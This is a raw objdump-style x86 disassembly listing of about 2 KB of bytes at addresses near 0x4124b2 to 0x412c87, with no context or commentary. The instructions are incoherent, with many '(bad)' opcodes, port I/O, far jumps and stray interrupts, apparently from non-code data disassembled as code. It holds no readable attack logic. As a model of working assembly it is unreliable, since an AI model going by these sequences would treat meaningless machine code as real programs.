  4124b2:	lods   al,BYTE PTR es:[esi]
  4124b4:	loop   0x412500
  4124b6:	mov    bh,0x28
  4124b8:	outs   dx,BYTE PTR ds:[esi]
  4124b9:	in     al,0xd7
  4124bb:	(bad)  
  4124bc:	mov    es,WORD PTR fs:[ebx+ecx*4+0xd]
  4124c1:	add    BYTE PTR [edx],0xcd
  4124c4:	dec    edx
  4124c5:	jns    0x41247a
  4124c7:	out    dx,eax
  4124c8:	repnz push cs
  4124ca:	xchg   dl,bh
  4124cc:	adc    esi,edi
  4124ce:	jb     0x4124c5
  4124d0:	cmp    DWORD PTR [edi+0x3a2694e],edi
  4124d6:	rcr    BYTE PTR [ebx+eiz*2-0x78],cl
  4124da:	mov    WORD PTR [edi+0x42],?
  4124dd:	xchg   BYTE PTR [edi+ebp*2-0x5aa55b06],bh
  4124e4:	scas   al,BYTE PTR es:[edi]
  4124e5:	gs jb  0x412513
  4124e8:	ins    BYTE PTR es:[edi],dx
  4124e9:	mov    ebx,0x779c2fee
  4124ee:	int    0xeb
  4124f0:	gs mov ch,0x9a
  4124f3:	cmp    DWORD PTR [eax],ecx
  4124f5:	cmc    
  4124f6:	gs add eax,0x5de16607
  4124fc:	imul   esp,DWORD PTR gs:[ebx-0x2a4a5483],0x8775b8cc
  412507:	or     al,0xca
  412509:	xor    al,0x92
  41250b:	outs   dx,BYTE PTR ds:[esi]
  41250c:	fisub  WORD PTR [esp+ebx*4+0x5]
  412510:	mov    ecx,ss
  412512:	push   eax
  412513:	lods   eax,DWORD PTR ds:[esi]
  412514:	mov    bl,dh
  412516:	and    DWORD PTR [esi-0x4f],ecx
  412519:	(bad)  
  41251a:	lods   eax,DWORD PTR gs:[esi]
  41251c:	lods   al,BYTE PTR ds:[esi]
  41251d:	scas   eax,DWORD PTR es:[edi]
  41251e:	out    0x12,eax
  412520:	mov    al,0x23
  412522:	lea    ebx,[edi+eax*4-0x749ba6e9]
  412529:	or     al,0x5
  41252b:	xchg   BYTE PTR [esi+0x7542744a],ah
  412531:	rcr    BYTE PTR [edi],1
  412533:	or     BYTE PTR [edx-0x1],bh
  412536:	pushw  ss
  412538:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412539:	add    esi,DWORD PTR [esi+eiz*8-0x2a9d992c]
  412540:	pop    esp
  412541:	ja     0x412578
  412543:	xchg   esp,eax
  412544:	in     eax,dx
  412545:	cdq    
  412546:	in     eax,dx
  412547:	popf   
  412548:	mov    bh,0xea
  41254a:	xchg   al,ch
  41254c:	push   ds
  41254d:	jmp    0xbc4c4f0
  412552:	test   eax,0x806c204e
  412557:	dec    DWORD PTR [eax+eax*8]
  41255a:	shr    edx,cl
  41255c:	fcmovbe st,st(7)
  41255e:	scas   al,BYTE PTR es:[edi]
  41255f:	mov    ch,0x7c
  412561:	loopne 0x4125cd
  412563:	in     al,dx
  412564:	sahf   
  412565:	shl    DWORD PTR [edx-0x7f573c6],0x15
  41256c:	aad    0xd7
  41256e:	sbb    dl,BYTE PTR [ecx+0x22]
  412571:	push   0xffffffcc
  412573:	les    edx,FWORD PTR [edi]
  412575:	mov    DWORD PTR [ecx-0x524108b],ecx
  41257b:	xchg   edi,eax
  41257c:	rcl    BYTE PTR [ecx*8-0x76a072b9],1
  412583:	in     eax,0x20
  412585:	dec    eax
  412586:	xlat   BYTE PTR ds:[ebx]
  412587:	sub    DWORD PTR [eax+0xdef4fae],ecx
  41258d:	cmc    
  41258e:	cmp    al,0x4e
  412590:	jno    0x4125fc
  412592:	pop    es
  412593:	mov    bl,0x1a
  412595:	dec    ecx
  412596:	jle    0x4125aa
  412598:	mov    eax,0xacfc9069
  41259d:	(bad)  
  41259e:	mov    eax,0xab2c5828
  4125a3:	add    al,0x50
  4125a5:	jns    0x41253c
  4125a7:	js     0x412573
  4125a9:	sbb    eax,0xec1cd0f9
  4125ae:	xor    dl,al
  4125b0:	sahf   
  4125b1:	fwait
  4125b2:	daa    
  4125b3:	add    BYTE PTR [ecx],ah
  4125b5:	adc    al,0xf5
  4125b7:	dec    edi
  4125b8:	dec    ebp
  4125b9:	mov    DWORD PTR [esi+0x53be7c3e],ebx
  4125bf:	mov    cl,0x75
  4125c1:	fdiv   DWORD PTR ds:0xc616844f
  4125c7:	(bad)  
  4125c8:	jle    0x41254d
  4125ca:	dec    esi
  4125cb:	inc    ebp
  4125cc:	ds push es
  4125ce:	add    al,0xd3
  4125d0:	(bad)  
  4125d1:	jmp    0x41257c
  4125d3:	test   BYTE PTR [eax],al
  4125d5:	push   ds
  4125d6:	mov    bl,BYTE PTR [edx-0x25]
  4125d9:	mov    ds:0x24649ea0,al
  4125de:	or     DWORD PTR [edi],ebx
  4125e0:	mov    bh,0x4a
  4125e2:	xor    eax,0xbe73aac
  4125e7:	(bad)  [eax+0x8]
  4125ea:	or     al,0x8
  4125ec:	mov    al,ds:0x21300412
  4125f1:	mov    al,0xb
  4125f3:	rol    DWORD PTR [ecx+0x54],1
  4125f6:	or     eax,0x11c6825
  4125fb:	pushf  
  4125fc:	sahf   
  4125fd:	test   eax,0x1b160744
  412602:	cmp    al,0x67
  412604:	sbb    eax,0xbdda7466
  412609:	sub    esp,esp
  41260b:	dec    edi
  41260c:	sbb    al,0xf9
  41260e:	outs   dx,DWORD PTR ds:[esi]
  41260f:	xchg   ebp,eax
  412610:	dec    eax
  412611:	aas    
  412612:	add    al,0xa3
  412614:	dec    edi
  412615:	inc    esp
  412616:	stos   DWORD PTR es:[edi],eax
  412617:	lea    ecx,[ecx+0x4e]
  41261a:	clc    
  41261b:	inc    ecx
  41261c:	mov    ch,0x88
  41261e:	lea    esp,[edx-0x56a6cf1d]
  412624:	sar    ah,cl
  412626:	aad    0x3f
  412628:	stos   DWORD PTR es:[edi],eax
  412629:	enter  0xbec9,0x8e
  41262d:	pop    esp
  41262e:	lods   al,BYTE PTR ds:[esi]
  41262f:	popa   
  412630:	neg    BYTE PTR [esi*1+0x3779087]
  412637:	push   esi
  412638:	int    0x35
  41263a:	jg     0x4126b2
  41263c:	lahf   
  41263d:	arpl   WORD PTR [ebx+0x3b],sp
  412640:	test   al,0xaa
  412642:	push   ebp
  412643:	fwait
  412644:	rol    DWORD PTR [eax+edi*8],0xca
  412648:	or     esp,DWORD PTR ds:0x4ec9ea2
  41264e:	je     0x41269f
  412650:	pop    edi
  412651:	mov    al,0xc4
  412653:	cli    
  412654:	pop    ds
  412655:	adc    esi,DWORD PTR [ecx]
  412657:	mov    esp,0x18edf013
  41265c:	in     eax,0xb7
  41265e:	mov    edx,0x9a7d3798
  412663:	sub    ecx,0x25
  412666:	sbb    al,bh
  412668:	add    DWORD PTR [edi],ecx
  41266a:	cmp    bh,BYTE PTR ds:[ecx+0x2f]
  41266e:	or     edx,DWORD PTR [eax+edi*4+0x9]
  412672:	sti    
  412673:	test   al,ah
  412675:	repz pop esi
  412677:	adc    al,0x62
  412679:	push   esi
  41267a:	sbb    ebx,DWORD PTR [ecx+ebp*8]
  41267d:	jo     0x41261c
  41267f:	idiv   DWORD PTR [ebx-0x16d557b4]
  412685:	icebp  
  412686:	in     eax,dx
  412687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412688:	or     bl,dl
  41268a:	out    0x43,eax
  41268c:	data16 cmp BYTE PTR [edx+0x3d],dh
  412690:	ret    
  412691:	xchg   edx,eax
  412692:	pop    ebp
  412693:	adc    bl,BYTE PTR [edi-0xadc5acb]
  412699:	push   edi
  41269a:	shl    DWORD PTR [eax],0x3c
  41269d:	fstp   DWORD PTR [esi-0x60]
  4126a0:	je     0x412694
  4126a2:	jp     0x41271f
  4126a4:	and    DWORD PTR [edi-0x5f],ecx
  4126a7:	pop    DWORD PTR [edi-0x1bce9759]
  4126ad:	inc    ebx
  4126ae:	and    ch,BYTE PTR ds:0x8a94834b
  4126b4:	dec    ebx
  4126b5:	sti    
  4126b6:	(bad)  
  4126b7:	int3   
  4126b8:	or     esp,ebp
  4126ba:	in     eax,0xe5
  4126bc:	mov    bl,0xb0
  4126be:	mov    esi,0xf7577d8a
  4126c3:	sbb    esi,DWORD PTR [ecx-0x47]
  4126c6:	gs loope 0x41269b
  4126c9:	pop    edi
  4126ca:	mov    WORD PTR ds:0xac746c78,fs
  4126d0:	mov    esp,0xb57cc629
  4126d5:	mov    edi,ebx
  4126d7:	(bad)  
  4126d8:	leave  
  4126d9:	xchg   ebx,eax
  4126da:	fwait
  4126db:	ret    0x3057
  4126de:	shl    BYTE PTR [edi+0x4489b697],cl
  4126e4:	out    dx,eax
  4126e5:	push   cs
  4126e6:	dec    ecx
  4126e7:	rol    DWORD PTR [esi-0x3c932f35],cl
  4126ed:	in     al,0x27
  4126ef:	push   ecx
  4126f0:	xor    al,0x47
  4126f2:	xor    bl,BYTE PTR [ecx-0x1e]
  4126f5:	xchg   ebp,ebx
  4126f7:	pop    edi
  4126f8:	aad    0xe9
  4126fa:	xor    dl,BYTE PTR [esi]
  4126fc:	and    BYTE PTR [ebx+0x57],dl
  4126ff:	dec    eax
  412700:	push   edi
  412701:	aam    0x78
  412703:	aaa    
  412704:	mov    ah,0x7
  412706:	add    eax,0x87d45ecb
  41270b:	mov    al,0xc4
  41270d:	pop    esi
  41270e:	mov    esp,0x7f8ed8eb
  412713:	outs   dx,BYTE PTR ds:[esi]
  412714:	les    edi,FWORD PTR [ebx+ebp*2+0x69]
  412718:	mov    edx,DWORD PTR [esi]
  41271a:	outs   dx,BYTE PTR ds:[esi]
  41271b:	popf   
  41271c:	lahf   
  41271d:	xchg   edx,eax
  41271e:	and    al,0x80
  412720:	pop    edx
  412721:	sub    eax,0x1487e358
  412726:	shl    DWORD PTR [ecx-0x22],1
  412729:	adc    cl,BYTE PTR [ebx-0x7f041e60]
  41272f:	mov    bl,ch
  412731:	adc    eax,0x3d4a8265
  412736:	call   0xc9f9c889
  41273b:	push   esi
  41273c:	(bad)  
  41273d:	out    0x20,al
  41273f:	mov    bh,0xe0
  412741:	jmp    0x412705
  412743:	xchg   ebx,eax
  412744:	lock cmovp eax,edi
  412748:	inc    edi
  412749:	add    DWORD PTR [ebx+ecx*2],0xffffffc0
  41274d:	arpl   dx,ax
  41274f:	push   0x2623d657
  412754:	cmc    
  412755:	mov    dh,0xf0
  412757:	sti    
  412758:	and    DWORD PTR [ebx],edx
  41275a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41275b:	jge    0x4127ae
  41275d:	call   0xd699b483
  412762:	lods   al,BYTE PTR ds:[esi]
  412763:	cmp    al,0x4
  412765:	arpl   WORD PTR [ebx+0x58e1567],dx
  41276b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41276c:	xor    al,0x10
  41276e:	rcr    esp,0x1a
  412771:	ss inc ecx
  412773:	sbb    ebp,ecx
  412775:	aaa    
  412776:	bound  edx,QWORD PTR [esi-0x151e8092]
  41277c:	jg     0x412773
  41277e:	repnz sub ah,ch
  412781:	loop   0x4127ef
  412783:	aad    0x10
  412785:	fild   WORD PTR [ebp-0x1e9e0907]
  41278b:	push   ebp
  41278c:	mov    ds:0x70159f5e,eax
  412791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412792:	out    dx,eax
  412793:	jecxz  0x412728
  412795:	arpl   WORD PTR [edi+0x71a8730c],cx
  41279b:	call   0x545a65e4
  4127a0:	xchg   edx,eax
  4127a1:	outs   dx,BYTE PTR ds:[esi]
  4127a2:	shr    cl,1
  4127a4:	aas    
  4127a5:	pop    ebx
  4127a6:	aam    0xa
  4127a8:	jmp    0xfd77db08
  4127ad:	idiv   BYTE PTR [ecx]
  4127af:	add    edi,DWORD PTR [eax-0x48020154]
  4127b5:	ret    0xd69a
  4127b8:	dec    ebp
  4127b9:	pop    edi
  4127ba:	aam    0x9b
  4127bc:	inc    edx
  4127bd:	pop    edi
  4127be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127bf:	mov    ?,WORD PTR [esi-0x2d6267c9]
  4127c5:	and    DWORD PTR [esi+0xddbde07],edx
  4127cb:	lds    esi,FWORD PTR [ebp-0xb1da8e7]
  4127d1:	jno    0x4127cb
  4127d3:	cmp    al,0x8d
  4127d5:	pushf  
  4127d6:	mov    esp,0xa9566ce2
  4127db:	mov    esp,0x73cc665f
  4127e0:	fiadd  WORD PTR [eax]
  4127e2:	scas   eax,DWORD PTR es:[edi]
  4127e3:	xchg   edx,eax
  4127e4:	fwait
  4127e5:	pop    ebx
  4127e6:	and    al,0x79
  4127e8:	test   BYTE PTR ds:0x5acc5db3,bl
  4127ee:	push   eax
  4127ef:	xchg   edi,eax
  4127f0:	jecxz  0x4127c1
  4127f2:	jb     0x41280d
  4127f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127f5:	lea    ecx,[esp+eiz*2]
  4127f8:	push   esp
  4127f9:	scas   al,BYTE PTR es:[edi]
  4127fa:	or     eax,DWORD PTR [ebx-0x7f]
  4127fd:	ins    BYTE PTR es:[edi],dx
  4127fe:	icebp  
  4127ff:	imul   eax,ecx,0x541b8eef
  412805:	and    eax,0xeaca4244
  41280a:	cld    
  41280b:	jle    0x412854
  41280d:	lahf   
  41280e:	push   DWORD PTR [esi-0x8]
  412811:	sahf   
  412812:	mov    eax,0xafc37072
  412817:	and    eax,0xb1bb32d4
  41281c:	sub    al,0xb2
  41281e:	mul    esp
  412820:	in     eax,dx
  412821:	xchg   edx,eax
  412822:	xor    edi,DWORD PTR [ecx-0xe8babae]
  412828:	fldenv [eax+0x43]
  41282b:	xchg   edi,eax
  41282c:	mov    ds:0xe6f61b42,eax
  412831:	or     eax,0xdf8c11ce
  412836:	and    eax,0x4ffd9429
  41283b:	add    cl,BYTE PTR [edx]
  41283d:	and    DWORD PTR [edi+0x17],0x12
  412841:	pop    es
  412842:	pop    ds
  412843:	std    
  412844:	adc    ch,al
  412846:	mov    DWORD PTR [edi],0x24830aa4
  41284c:	loope  0x41289f
  41284e:	inc    edi
  41284f:	fwait
  412850:	jmp    0x61153690
  412855:	cmp    eax,0x1b3f625f
  41285a:	jnp    0x4128a4
  41285c:	mov    edi,cr6
  41285f:	ins    DWORD PTR es:[edi],dx
  412860:	xor    BYTE PTR [ebx],dh
  412862:	push   0xe1976308
  412867:	push   ds
  412868:	inc    eax
  412869:	mov    ds:0xf11e4ff9,eax
  41286e:	mov    ch,0x35
  412870:	fistp  QWORD PTR [ebx]
  412872:	jns    0x412805
  412874:	sbb    DWORD PTR ds:0xfa7980e2,ebp
  41287a:	sub    DWORD PTR [eax],0xffffffe9
  41287d:	cli    
  41287e:	sti    
  41287f:	and    DWORD PTR [edx],ecx
  412881:	inc    ecx
  412882:	add    DWORD PTR [eax+0x7e],0xc029e536
  412889:	js     0x4128df
  41288b:	fs mov dl,0x3
  41288e:	js     0x41285f
  412890:	scas   al,BYTE PTR es:[edi]
  412891:	(bad)  
  412892:	push   0xffffffd9
  412894:	ror    bh,cl
  412896:	add    cl,0x61
  412899:	test   eax,0x4573361c
  41289e:	push   esp
  41289f:	aam    0xb6
  4128a1:	add    dl,ah
  4128a3:	lock fistp DWORD PTR ds:0x7d773007
  4128aa:	repz popf 
  4128ac:	or     eax,0x8ccf9e79
  4128b1:	add    al,0xdb
  4128b3:	fsubr  DWORD PTR [ebx+edi*1]
  4128b6:	mov    BYTE PTR ds:0xebf73bba,bl
  4128bc:	or     eax,0x92f75c36
  4128c1:	hlt    
  4128c2:	mov    esp,0xd5b88259
  4128c7:	xor    al,cl
  4128c9:	pop    edi
  4128ca:	pop    ss
  4128cb:	add    edi,DWORD PTR [ecx]
  4128cd:	mov    bl,0xa5
  4128cf:	add    eax,0x598d98f6
  4128d4:	inc    edx
  4128d5:	pop    esp
  4128d6:	out    dx,eax
  4128d7:	pop    ebp
  4128d8:	dec    ebp
  4128d9:	mov    esp,0xaad268af
  4128de:	dec    eax
  4128df:	fdivr  st,st(0)
  4128e1:	rcl    BYTE PTR [edx],0xdb
  4128e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128e5:	icebp  
  4128e6:	rcr    dl,0x4e
  4128e9:	sbb    bh,bh
  4128eb:	dec    ebp
  4128ec:	popf   
  4128ed:	inc    esp
  4128ee:	push   esi
  4128ef:	mov    edi,0x2e370594
  4128f4:	push   ebp
  4128f5:	push   0x28
  4128f7:	push   ebp
  4128f8:	pushf  
  4128f9:	bound  eax,QWORD PTR [ebx+0x42]
  4128fc:	loop   0x412960
  4128fe:	jae    0x412927
  412900:	mov    dl,0xf
  412902:	imul   esi,ebx,0xe4807ae0
  412908:	dec    esi
  412909:	xchg   esi,eax
  41290a:	fwait
  41290b:	push   0x16bb88c1
  412910:	lods   al,BYTE PTR ds:[esi]
  412911:	stos   BYTE PTR es:[edi],al
  412912:	je     0x4128ec
  412914:	sub    al,0x6b
  412916:	sub    esi,esp
  412918:	ret    
  412919:	int    0xb3
  41291b:	lea    ebx,[edi+esi*4-0x1b]
  41291f:	push   eax
  412920:	mov    edi,0x57770b0d
  412925:	leave  
  412926:	sub    al,0x39
  412928:	mov    bl,0xa9
  41292a:	mov    al,ds:0xbd524743
  41292f:	into   
  412930:	in     eax,dx
  412931:	xchg   DWORD PTR [edi+0x2ea32fbd],edx
  412937:	sub    esp,esi
  412939:	push   ecx
  41293a:	js     0x4128bd
  41293c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41293d:	mov    dl,0x53
  41293f:	dec    ecx
  412940:	mov    esi,0x630e9c45
  412945:	iret   
  412946:	pushf  
  412947:	(bad)  
  412948:	in     eax,dx
  412949:	mov    ds:0x735fcfe8,al
  41294e:	imul   ebx,DWORD PTR [esi-0x3],0xffffff81
  412952:	and    al,0xa6
  412954:	cld    
  412955:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412956:	or     BYTE PTR [eax+0x6f],dh
  412959:	lods   eax,DWORD PTR ds:[esi]
  41295a:	xchg   ecx,eax
  41295b:	enter  0x7822,0xf4
  41295f:	push   ds
  412960:	mov    cl,0x55
  412962:	add    dh,BYTE PTR ds:0xc5d239c0
  412968:	cmp    ebp,edx
  41296a:	dec    eax
  41296b:	add    DWORD PTR [edi],0x27d76da6
  412971:	shl    DWORD PTR [eax-0x29544e52],cl
  412977:	cdq    
  412978:	add    al,0xa3
  41297a:	pop    es
  41297b:	push   esp
  41297c:	pop    ds
  41297d:	int    0xe5
  41297f:	mov    ds:0x2bde39aa,al
  412984:	in     eax,0x39
  412986:	(bad)  
  412987:	sbb    al,0x60
  412989:	lahf   
  41298a:	fucompp 
  41298c:	and    DWORD PTR [edi+eiz*1],edi
  41298f:	inc    ecx
  412990:	inc    ebx
  412991:	push   0x44
  412993:	add    ecx,esi
  412995:	mov    ah,0xf5
  412997:	dec    edi
  412998:	mov    al,ds:0xad9503a3
  41299d:	fsub   QWORD PTR [esi]
  41299f:	(bad)  
  4129a0:	jmp    0x90a:0x39bc9a69
  4129a7:	xchg   edi,eax
  4129a8:	out    0x28,eax
  4129aa:	ss lock xor esp,esi
  4129ae:	pop    ds
  4129af:	out    dx,al
  4129b0:	or     ch,BYTE PTR [edx+0x18e1f2ef]
  4129b6:	(bad)  
  4129b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129b8:	push   ecx
  4129b9:	call   DWORD PTR [edx-0x63fb4135]
  4129bf:	mov    dh,bl
  4129c1:	xlat   BYTE PTR ds:[ebx]
  4129c2:	mov    dh,0x5
  4129c4:	shl    DWORD PTR [ecx+edx*8-0x171e493c],cl
  4129cb:	dec    ebp
  4129cc:	inc    esi
  4129cd:	sbb    dl,0xc3
  4129d0:	push   eax
  4129d1:	aam    0x40
  4129d3:	repnz or edi,DWORD PTR [edx+esi*4+0x2b]
  4129d8:	ds inc edi
  4129da:	mov    edx,0x248bb85a
  4129df:	cmc    
  4129e0:	jae    0x412a47
  4129e2:	nop
  4129e3:	cmp    dh,ch
  4129e5:	mov    ecx,0x9ebb16c8
  4129ea:	stos   BYTE PTR es:[edi],al
  4129eb:	imul   ebp,DWORD PTR [edi+0x1e6858bc],0x846c6411
  4129f5:	test   BYTE PTR [ecx-0x35],al
  4129f8:	lahf   
  4129f9:	stos   BYTE PTR es:[edi],al
  4129fa:	inc    ecx
  4129fb:	add    al,dh
  4129fd:	pop    es
  4129fe:	cwde   
  4129ff:	fiadd  WORD PTR [eax-0x32]
  412a02:	pop    ebp
  412a03:	mov    esp,0xfa165012
  412a08:	aaa    
  412a09:	imul   BYTE PTR [ebx+eax*1+0x1a]
  412a0d:	(bad)  
  412a0e:	in     al,dx
  412a0f:	adc    BYTE PTR [ebx-0x52],al
  412a12:	mov    ah,0x5b
  412a14:	push   es
  412a15:	retf   0x24d8
  412a18:	inc    edi
  412a19:	imul   ebx,DWORD PTR [ebx],0x33
  412a1c:	push   ecx
  412a1d:	adc    dl,dh
  412a1f:	pusha  
  412a20:	cld    
  412a21:	je     0x412a02
  412a23:	mov    bh,0x9e
  412a25:	lods   al,BYTE PTR ds:[esi]
  412a26:	push   es
  412a27:	test   BYTE PTR [edi],cl
  412a29:	fs enter 0x6e80,0xd1
  412a2e:	fidivr DWORD PTR [esi+0x4b38e19f]
  412a34:	add    dh,BYTE PTR [edi]
  412a36:	icebp  
  412a37:	and    cl,BYTE PTR [edi]
  412a39:	fimul  DWORD PTR ds:0xd001b0a5
  412a3f:	xor    DWORD PTR [edi-0x6e333c2c],0xffffff8f
  412a46:	dec    eax
  412a47:	lock jnp 0x412aa7
  412a4a:	iret   
  412a4b:	sbb    bl,al
  412a4d:	push   DWORD PTR [esp+eax*2+0xf651331]
  412a54:	mov    ecx,0xe30e1b55
  412a59:	sub    ebx,DWORD PTR ds:0x966647b7
  412a5f:	int    0x54
  412a61:	nop
  412a62:	sahf   
  412a63:	xchg   esi,eax
  412a64:	call   0x6ccb:0x1db1ae1
  412a6b:	xor    BYTE PTR [edx+0x579cdf7b],0xda
  412a72:	add    eax,0xc0b5bd30
  412a77:	iret   
  412a78:	ja     0x412a79
  412a7a:	pusha  
  412a7b:	loopne 0x412a82
  412a7d:	mov    dh,0xba
  412a7f:	mov    eax,0x44f52389
  412a84:	dec    eax
  412a85:	cdq    
  412a86:	push   cs
  412a87:	sar    BYTE PTR [ecx],cl
  412a89:	shl    BYTE PTR [eax-0x8be79d7],cl
  412a8f:	xor    BYTE PTR [ebp-0x4f],cl
  412a92:	cs std 
  412a94:	xlat   BYTE PTR ds:[ebx]
  412a95:	push   eax
  412a96:	aam    0xc4
  412a98:	cmp    eax,0xbc738315
  412a9d:	call   0x9e67863b
  412aa2:	test   DWORD PTR [ebx+0x71],ebp
  412aa5:	cmp    BYTE PTR gs:[ecx+0x14],dh
  412aa9:	sub    eax,0xbbbe069
  412aae:	jmp    0x30803bc3
  412ab3:	lds    ecx,FWORD PTR [ebp+0x0]
  412ab6:	add    BYTE PTR [ecx],al
  412ab8:	jecxz  0x412a8f
  412aba:	sbb    ch,BYTE PTR [esi]
  412abc:	pop    ebx
  412abd:	xlat   BYTE PTR ds:[ebx]
  412abe:	or     eax,0xc5d7800
  412ac3:	adc    BYTE PTR [ecx-0x12],0x65
  412ac7:	pushf  
  412ac8:	xchg   ecx,eax
  412ac9:	sbb    al,0xdb
  412acb:	xor    BYTE PTR [edi],bl
  412acd:	dec    esi
  412ace:	leave  
  412acf:	push   esi
  412ad0:	mov    ebx,DWORD PTR [esp+eax*8]
  412ad3:	mov    ebx,DWORD PTR [ecx]
  412ad5:	adc    ch,BYTE PTR [edi-0x6c7036cb]
  412adb:	jae    0x412ab7
  412add:	sub    ah,BYTE PTR [ebp-0x1b4b1905]
  412ae3:	aas    
  412ae4:	inc    eax
  412ae5:	aaa    
  412ae6:	mov    al,ds:0xe8a845d1
  412aeb:	inc    edx
  412aec:	loopne 0x412b62
  412aee:	call   0xe501a4aa
  412af3:	push   0xffffff89
  412af5:	push   es
  412af6:	lds    ebp,FWORD PTR [edx-0x7b]
  412af9:	out    0xd7,al
  412afb:	xor    eax,0xdf510689
  412b00:	lods   eax,DWORD PTR ds:[esi]
  412b01:	mov    ebp,0xd323bd9a
  412b06:	xchg   DWORD PTR [edx],edx
  412b08:	aad    0x6d
  412b0a:	sbb    BYTE PTR [esi+0x4],dl
  412b0d:	mov    edi,0xe5c6337f
  412b12:	mov    dl,0x45
  412b14:	ret    0x1cee
  412b17:	mov    cs,WORD PTR [esi]
  412b19:	sub    DWORD PTR [edx+0x15d5249],esi
  412b1f:	adc    ecx,ebp
  412b21:	mov    al,ds:0x902aac1f
  412b26:	jge    0x412afb
  412b28:	test   eax,0xec775a45
  412b2d:	inc    ebx
  412b2e:	fwait
  412b2f:	sbb    eax,0xf3ac87aa
  412b34:	inc    edx
  412b35:	sahf   
  412b36:	sbb    ah,ah
  412b38:	xchg   esi,eax
  412b39:	ret    0xc2dc
  412b3c:	mov    DWORD PTR [edx+esi*8],0x51a4bc3d
  412b43:	outs   dx,BYTE PTR ds:[esi]
  412b44:	dec    esp
  412b45:	xchg   DWORD PTR gs:[edx+ebx*4+0x16],ebx
  412b4a:	dec    eax
  412b4b:	xor    DWORD PTR [ebx+edx*1-0x21],ebp
  412b4f:	add    dl,0xbf
  412b52:	inc    esi
  412b53:	in     al,dx
  412b54:	add    al,0x28
  412b56:	sub    al,0x91
  412b58:	nop
  412b59:	outs   dx,DWORD PTR ds:[esi]
  412b5a:	xchg   esp,eax
  412b5b:	shr    DWORD PTR [eax],cl
  412b5d:	sahf   
  412b5e:	lahf   
  412b5f:	xor    ch,BYTE PTR [ecx-0x27]
  412b62:	and    eax,0xc9971a4f
  412b67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b68:	sub    DWORD PTR [esi-0x43b2c396],0x82d53836
  412b72:	or     ebx,ecx
  412b74:	sar    BYTE PTR [esi+0x5eab0e77],cl
  412b7a:	loop   0x412b0a
  412b7c:	jno    0x412b26
  412b7e:	mov    DWORD PTR [ebp+0x1c],edx
  412b81:	jae    0x412b56
  412b83:	sub    eax,0xc298b2ff
  412b88:	dec    eax
  412b89:	hlt    
  412b8a:	dec    ecx
  412b8b:	retf   0xdef1
  412b8e:	rol    DWORD PTR [edx],cl
  412b90:	int    0x48
  412b92:	dec    ecx
  412b93:	xchg   esp,eax
  412b94:	(bad)  
  412b95:	xor    eax,0x30761856
  412b9a:	rcr    DWORD PTR [edx+0x10],0xf6
  412b9e:	rcr    BYTE PTR ds:0x7e3b38bf,cl
  412ba4:	lods   eax,DWORD PTR ds:[esi]
  412ba5:	cwde   
  412ba6:	cli    
  412ba7:	or     edx,ecx
  412ba9:	mov    BYTE PTR [ebp-0x612b5996],ah
  412baf:	sub    DWORD PTR [ecx-0x48],esp
  412bb2:	or     DWORD PTR [eax-0x58],edi
  412bb5:	ins    DWORD PTR es:[edi],dx
  412bb6:	(bad)  
  412bb7:	dec    esp
  412bb8:	cli    
  412bb9:	pop    esi
  412bba:	ja     0x412bec
  412bbc:	xor    eax,0x3e422eec
  412bc1:	adc    ebx,DWORD PTR [edi+edx*4-0x6]
  412bc5:	jae    0x412c22
  412bc7:	xor    dl,BYTE PTR [ecx+ecx*2]
  412bca:	pushf  
  412bcb:	int    0x50
  412bcd:	retf   0x6f42
  412bd0:	mov    WORD PTR [edx],?
  412bd2:	adc    ebp,DWORD PTR [eax-0x7bdc0a2f]
  412bd8:	fisttp WORD PTR [edx-0x2d97e3d2]
  412bde:	xchg   edi,eax
  412bdf:	mov    eax,0x705291ff
  412be4:	in     eax,0xf4
  412be6:	and    DWORD PTR [ebp-0x5],0xffffffbd
  412bea:	arpl   WORD PTR [edi-0x31],ax
  412bed:	stc    
  412bee:	fisub  WORD PTR [ecx+0x51]
  412bf1:	mov    ds:0xeaf2b188,eax
  412bf6:	cmp    cl,BYTE PTR [edx-0x54153437]
  412bfc:	(bad)  
  412bfd:	fldenv [ebp+0x78299930]
  412c03:	(bad)  
  412c07:	jl     0x412c52
  412c09:	test   DWORD PTR [eax+0x55c2839f],esi
  412c0f:	or     ebx,DWORD PTR [edx+ebx*2]
  412c12:	dec    ecx
  412c13:	mov    ch,0xa
  412c15:	lods   eax,DWORD PTR ds:[esi]
  412c16:	push   esi
  412c17:	mov    ch,0x1b
  412c19:	add    ecx,DWORD PTR [esi-0x4f]
  412c1c:	jmp    0xde01:0x923f79b0
  412c23:	mov    WORD PTR [ebp-0x78],es
  412c26:	ss cmp eax,0xd4bfa5f0
  412c2c:	sbb    eax,0xb6a4ba08
  412c31:	pop    ebp
  412c32:	xor    ebp,DWORD PTR [ebx-0xcf7190]
  412c38:	sahf   
  412c39:	sub    eax,DWORD PTR [edx-0x2274e27d]
  412c3f:	sbb    eax,ecx
  412c41:	push   esp
  412c42:	mov    dl,0x43
  412c44:	mov    ds:0xd70629e2,eax
  412c49:	imul   edx,DWORD PTR [esp+esi*1],0x9
  412c4d:	sub    eax,0x241c9244
  412c52:	jecxz  0x412c2a
  412c54:	push   edx
  412c55:	jns    0x412cb9
  412c57:	mov    es,esi
  412c59:	xchg   esi,eax
  412c5a:	in     al,0xb9
  412c5c:	popf   
  412c5d:	(bad)  
  412c5e:	xor    eax,DWORD PTR [ebp+0x45]
  412c61:	xchg   BYTE PTR ds:0x2aab97bd,dl
  412c67:	aad    0x88
  412c69:	pop    ss
  412c6a:	mov    ah,0x61
  412c6c:	aam    0x94
  412c6e:	xchg   edi,eax
  412c6f:	mov    al,0x57
  412c71:	je     0x412c8d
  412c73:	jae    0x412cb2
  412c75:	jmp    0x9989:0x9af7fc26
  412c7c:	inc    eax
  412c7d:	cdq    
  412c7e:	sub    DWORD PTR [edi-0x62],0xffffff96
  412c82:	dec    eax
  412c83:	repnz mov edx,esp
  412c86:	pop    ebx
  412c87:	cld    
